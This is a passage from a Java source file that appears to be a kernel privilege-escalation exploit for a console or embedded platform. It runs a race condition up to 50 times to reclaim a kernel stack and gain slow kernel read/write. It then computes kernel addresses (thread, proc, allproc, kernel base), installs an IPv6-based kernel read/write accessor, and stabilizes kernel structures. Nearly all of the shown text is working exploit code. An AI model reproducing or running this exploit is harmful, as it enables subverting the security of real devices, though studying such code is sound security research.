                        DebugStatus.info("[+] possible thread pointer: " + threadPtr);
                    }
                    break;
                }
            }
            break;
        }

        stopBadKprimThreads(neo);

        if (neo == -1) {
            DebugStatus.info("[-] Failed to reclaim with kernel stack, halting this race attempt");
            if (!Pointer.NULL.equals(kstack)) {
                this.mappedKernelStackAddresses.add(kstack);
            }
            kPrimThreadData.cleanup();
        } else {
            KernelReadWrite.setAccessor(new KernelAccessorSlow(kPrimThreadData, kstack));
        }

        return new RWResult(neo);
    }

    protected boolean calculateKernelOffsets(KernelOffsetsCalculator calculator, Pointer kstack) {
        int swVer = mainLibKernel.getSystemSoftwareVersion();
        KernelAddressClassifier classifier = KernelAddressClassifier.fromBuffer(new Pointer(kstack.addr() + 0x3000, new Long(0x1000L)));
        boolean result = calculator.calculate(swVer, classifier, "reclaim#" + kPrimThreadData.neo.get());
        if (result) {
            DebugStatus.info("[+] thread=" + calculator.threadAddress);
            DebugStatus.info("[+] proc=" + calculator.processAddress);
            DebugStatus.info("[+] ofiles=" + calculator.processOpenFilesAddress);
            DebugStatus.info("[+] allproc=" + calculator.allProcAddress);
            if (!KernelPointer.NULL.equals(calculator.kernelAddressBase)) {
                DebugStatus.info("[+] kdata=" + calculator.kernelDataBase);
                DebugStatus.info("[+] kbase=" + calculator.kernelAddressBase);
            } else {
                DebugStatus.info("[-] kbase cannot be determined due to unknown offsets on the current firmware version");
            }
        }
        return result;
    }

    protected void stabilize(KernelOffsetsCalculator offsets, int lookupFd) throws SdkException {
        KernelStabilizer stabilizer = new KernelStabilizer();
        stabilizer.fixupKernelStack(offsets.threadAddress);
        DebugStatus.info("[+] kstack stabilized");

        int closeRet = stabilizer.fixupSharedMemory(offsets.processOpenFilesAddress, lookupFd);
        DebugStatus.info("[+] open files stabilized; lookup fd close=" + closeRet);

        // This does not seem necessary because the exploit is triggered fast enough that there are no lingering mappings
        if (mappedKernelStackAddresses.size() > 0) {
            int numFixes = stabilizer.fixupVmSpace(offsets.processAddress, mappedKernelStackAddresses);
            if (numFixes > 0) {
                DebugStatus.info("[+] vm space stabilized; fixed " + numFixes + " entries");
            }
        }
    }

    public void postExploit(int lookupFd) {
        // Slow kernel accessor installed, upgrade to a faster one
        if (KernelReadWrite.getAccessor() instanceof KernelAccessorSlow) {
            KernelAccessorSlow kaSlow = (KernelAccessorSlow) KernelReadWrite.getAccessor();
            KernelOffsetsCalculator offsets = new KernelOffsetsCalculator();

            if (calculateKernelOffsets(offsets, kaSlow.getKstack())) {
                try {
                    if (!KernelPointer.NULL.equals(offsets.processOpenFilesAddress)) {
                        KernelReadWrite.setAccessor(new KernelAccessorIPv6(offsets.processOpenFilesAddress, offsets.kernelAddressBase));
                        DebugStatus.info("[+] installed ipv6 based kernel r/w");

                        stabilize(offsets, lookupFd);
                    } else {
                        KernelReadWrite.setAccessor(null);
                    }
                } catch (SdkException | RuntimeException | Error e) {
                    Status.printStackTrace("[-] unable to upgrade kernel accessor", e);
                    KernelReadWrite.setAccessor(null);
                }
            } else {
                DebugStatus.info("[-] failed to determine kernel addresses");
                KernelReadWrite.setAccessor(null);
            }

            if (KernelReadWrite.getAccessor() == null) {
                DebugStatus.info("[-] removing slow kernel accessor before exiting");
            }

            // TODO: experiment with closing the last reclaim job
        } else {
            DebugStatus.error("[-] failed");
        }
    }

    @Override
    public void run() {
        final int MAX_ATTEMPTS = 50;

        int lookupFd = -1;
        for (int i = 1; i <= MAX_ATTEMPTS; ++i) {
            if ((i % 10) == 0) {
                DebugStatus.info("[+] exploit attempt " + i);
            }
            try {
                prepare();
                RaceResult raceResult = race();
                RWResult rwResult = null;
                if (raceResult.returnCode == 0) {
                    rwResult = getRW(raceResult.lookupFd, raceResult.reclaimFd);
                }
                cleanup();

                if (rwResult != null && rwResult.returnCode != -1) {
                    DebugStatus.info("[+] slow kernel r/w obtained");
                    lookupFd = raceResult.lookupFd;
                    break;
                }
            } catch (RuntimeException | Error e) {
                Status.printStackTrace("[-] unexpected runtime error", e);
            }
        }

        postExploit(lookupFd);

        mainLibKernel.closeLibrary();
        finished = true;
    }
}
